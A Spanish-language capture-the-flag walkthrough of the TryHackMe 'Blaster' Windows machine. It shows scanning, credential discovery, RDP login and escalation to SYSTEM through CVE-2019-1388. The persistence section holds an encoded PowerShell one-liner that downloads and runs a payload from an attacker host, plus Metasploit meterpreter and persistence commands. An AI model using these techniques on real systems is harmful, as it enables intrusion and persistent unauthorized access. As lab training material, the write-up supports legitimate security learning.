# Blaster - TryHackMe

![alt text](image.png)

## Reconocimiento

Vamos a iniciar con un escaneo de puertos para identificar los servicios que están corriendo en la máquina objetivo.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.130.164.211 -oG allPorts

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 126
3389/tcp open  ms-wbt-server syn-ack ttl 126
```

Veamos las versiones que están corriendo en los puertos abiertos:

```bash
nmap -sCV -p80,3389 10.130.164.211

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2026-07-13T18:44:24+00:00
|_ssl-date: 2026-07-13T18:44:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2026-07-12T18:41:06
|_Not valid after:  2027-01-11T18:41:06
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Vemos que el puerto 80 está corriendo un servidor web IIS (Microsoft Internet Information Services) y el puerto 3389 está corriendo un servicio de escritorio remoto (RDP), el nombre del host es `RETROWEB` y el dominio es `RetroWeb`.


Hagamos un escaneo de directorios en el puerto 80 para ver si encontramos algún recurso interesante:

```bash
gobuster dir -u http://10.130.164.211 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 --exclude-length 10701

/retro                (Status: 301) [Size: 151] [--> http://10.130.164.211/retro/]
/Retro                (Status: 301) [Size: 151] [--> http://10.130.164.211/Retro/]

```

Si visitamos la ruta `/retro` o `/Retro` en el navegador, nos redirige a la misma página, que es un sitio web de estilo retro.

![alt text](image-1.png)

Al final de la página vemos un login que nos lleva a la ruta `/Retro/wp-login.php`. 

Vamos a enumerar mejor el sitio web con `gobuster` para ver si encontramos algún recurso interesante:

```bash
gobuster dir -u http://10.130.164.211/retro -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 10701 --add-slash

/wp-content/          (Status: 200) [Size: 0]
/wp-includes/         (Status: 403) [Size: 1233]
/wp-admin/            (Status: 302) [Size: 0] [--> http://localhost/retro/wp-login.php?redirect_to=http%3A%2F%2F10.130.164.211%2Fretro%2Fwp-admin%2F&reauth=1]
```

Vemos que al ir al enlace de wp-admin nos redirige a un sitio el cual no llegamos seguramente por DNS.

Vemos que en la página hay un potencial usuario `Wade`

Si investigamos más encontramos que en http://10.130.164.211/retro/index.php/2019/12/09/ready-player-one/ dejó su contraseña `parzival`

Vamos a meternos a RDP con el usuario `Wade` y la contraseña `parzival`:

```bash
remmina -c rdp://Wade:parzival@10.130.164.211
```

Vemos el archivo `user.txt` en el escritorio, lo abrimos y obtenemos la bandera de usuario.

Mirando el contenido del escritorio, vemos un archivo llamado `hhupd` Microsoft HTML Help Control, que es un archivo de ayuda de Windows. Al abrirlo, nos encontramos que debemos ser administradores para poder abrirlo.

When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

Buscamos en el buscador de archivos y encontramos lo siguiente:

![alt text](image-2.png)

Encontramos que el CVE es `CVE-2019-1388`, Windows Privilege Escalation Through UAC

## Explotación

Para explotarlo, debemos darle a hhupd > Show more details > Show information about the publisher’s certificate > VeriSign Commercial Software Publishers CA > Ok > No

Se abre un navegador como System, y debemos guardar la  página: File > Save As y nos sale el error Location is not available.

Le damos a ok y ponemos este nombre al archivo: ` c:\windows\system32\*.*` y le damos enter.

Buscamos cmd, click derecho y lo abrimos.

```bash
whoami

nt authority\system
``` 

Para esta CVE he utilizado este blog: https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f


```bash
cd :\Users\Administrator\Desktop
type root.txt
```

## Persistencia

Utilizaremos metasploit y este módulo: `exploit/multi/script/web_delivery`

First, let's set the target to PSH (PowerShell). Which target number is PSH?

Para ver el target number de PSH, ejecutamos el siguiente comando:

```bash
show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python
    1   PHP
    2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X
```

```bash
set target 2
```
```bash
use exploit/multi/script/web_delivery

set LHOST 192.168.154.96
set payload windows/meterpreter/reverse_http

run -j

Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB5ADEAXwA9ACIAZQBjAGgAbwAgACgAJABlAG4AdgA6AHQAZQBtAHAAKwAnAFwAQQBkADUAVQBlAEgASwBJAC4AZQB4AGUAJwApACIAOwAgACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEANQA0AC4AOQA2ADoAOAAwADgAMAAvADIAVQBCAFMASABBACcALAAgACQAeQAxAF8AKQA7ACAAaQBuAHYAbwBrAGUALQBpAHQAZQBtACAAJAB5ADEAXwA==
```

Creamos un server en python para poder copiar y pegar a windows y ejecutar el payload:

```bash
python3 -m http.server 80
```

Al ejecutar el payload en la máquina objetivo, se nos abre una sesión de meterpreter en metasploit.

```bash
sessions -i 1
```

Para mantener el acceso a la máquina objetivo, y cree un listener cada vez que se reinicie, ejecutamos el siguiente comando:

```bash
run persistence -X

[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
[!] Example: run exploit/windows/local/persistence OPTION=value [...]
[-] The specified meterpreter session script could not be found: persistence

run exploit/windows/local/persistence -X
```

